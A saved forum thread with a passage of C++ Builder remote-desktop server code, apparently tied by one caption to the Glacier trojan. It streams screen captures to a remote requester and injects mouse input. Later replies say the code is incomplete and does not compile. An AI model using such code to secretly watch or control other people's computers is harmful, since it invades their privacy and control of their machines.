+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//ShowMessage(sRecvString.SubString(1,pos-1));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(sRecvString.SubString(1,pos-1)==&nbsp;"CM_ENTIRESCREEN&nbsp;")&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RectCmd&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;CM_ENTIRESCREEN;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;if(sRecvString.SubString(1,pos-1)==&nbsp;"CM_ACTIVEWINDOW&nbsp;")&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RectCmd&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;CM_ACTIVEWINDOW;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RectCmd&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;CM_CUSTORWINDOW;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cusRect.left&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToInt(sRecvString.SubString(16,4));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cusRect.right&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToInt(sRecvString.SubString(20,4));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cusRect.top&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToInt(sRecvString.SubString(24,4));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cusRect.bottom&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToInt(sRecvString.SubString(28,4));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//ShowMessage(RectCmd);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;接收端口&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;u_short(StrToIntDef(sRecvString.SubString(1,pos-1),0));&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;色深&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CL&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;品质&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CQ&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&nbsp;&nbsp;(port)&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TMemoryStream&nbsp;&nbsp;&nbsp;*ImageStream;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;定义数据流&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageStream&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;new&nbsp;&nbsp;&nbsp;TMemoryStream;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;分配内存&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;捕获当前屏幕并保存到ImageStream中&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CaptureImage(RectCmd,&nbsp;&nbsp;&nbsp;CL,&nbsp;&nbsp;&nbsp;CQ,&nbsp;&nbsp;&nbsp;ImageStream);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;发送ImageStream到接收端口&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&nbsp;&nbsp;(!SendStream(sRemoteAddress,&nbsp;&nbsp;&nbsp;port,&nbsp;&nbsp;&nbsp;ImageStream))&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//MessageBox(0,&nbsp;"发送数据流失败&nbsp;",&nbsp;"冰河&nbsp;",MB_ICONERROR);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServerSocket1-&gt;&nbsp;Close();&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServerSocket1-&gt;&nbsp;Open();&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__finally&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete&nbsp;&nbsp;&nbsp;ImageStream;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;释放资源&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;2://请求目标机屏幕分辨率&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;str[24];&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;Width=GetSystemMetrics(SM_CXSCREEN);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;Height=GetSystemMetrics(SM_CYSCREEN);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sprintf(str,&nbsp;"%d*%d\n&nbsp;",Width,Height);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket-&gt;&nbsp;SendText(str);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;3://&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;MouseCmd=StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;px=StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sRecvString&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.SubString(pos+1,sRecvString.Length()-pos);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;sRecvString.Pos(&nbsp;"\n&nbsp;");&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;py=StrToIntDef(sRecvString.SubString(1,pos-1),0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch(MouseCmd)&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;1://WM_MOUSEMOVE&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;2://WM_LBUTTONDOWN&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;3://WM_LBUTTONUP&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;4://WM_RBUTTONDOWN&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTDOWN,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;5://WM_RBUTTONUP&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTUP,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;6://WM_MIDBUTTONDOWN&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEDOWN,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&nbsp;&nbsp;7://WM_MIDBUTTONUP&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEUP,px,py,0,0);&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;<BR>
+&nbsp;<BR>
+<BR>
+</PRE></DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-1" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350778723/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350778723/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350778723/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350778723/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350778723/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350808480" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350808480">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhaozilongg" data-floor="2">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350808480">#2</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-23 09:24:09       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">这段代码不全吧。。<BR>
+      #include&nbsp;&nbsp;&nbsp;"UniMain.h&nbsp;"&nbsp;<BR>
+      #include&nbsp;&nbsp;&nbsp;"Socket.h&nbsp;"&nbsp;<BR>
+      #include&nbsp;&nbsp;&nbsp;"File.h&nbsp;"&nbsp;<BR>
+      #include&nbsp;&nbsp;&nbsp;"UniSetup.h&nbsp;"<BR>？？？是啥？<BR>
+      还有void&nbsp;&nbsp;&nbsp;__fastcall&nbsp;&nbsp;&nbsp;Tmain::FormCreate(TObject&nbsp;&nbsp;&nbsp;*Sender)<BR>
+      TMAIN没定义吧？<BR>
+      [C++&nbsp;Error]&nbsp;unit1.cpp(23):&nbsp;E2090&nbsp;Qualifier&nbsp;'Tmain'&nbsp;is&nbsp;not&nbsp;a&nbsp;class&nbsp;or&nbsp;namespace&nbsp;name 
+             </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-2" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350808480/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350808480/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350808480/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350808480/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350808480/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350808596" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350808596">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhaozilongg" data-floor="3">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350808596">#3</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-23 09:27:14       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">还有Tmain&nbsp;&nbsp;&nbsp;*main;<BR>
+      [C++&nbsp;Error]&nbsp;unit1.cpp(17):&nbsp;E2141&nbsp;Declaration&nbsp;syntax&nbsp;error<BR></DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-3" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350808596/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350808596/bury?topic_id=350001529" rel="nofollow" 
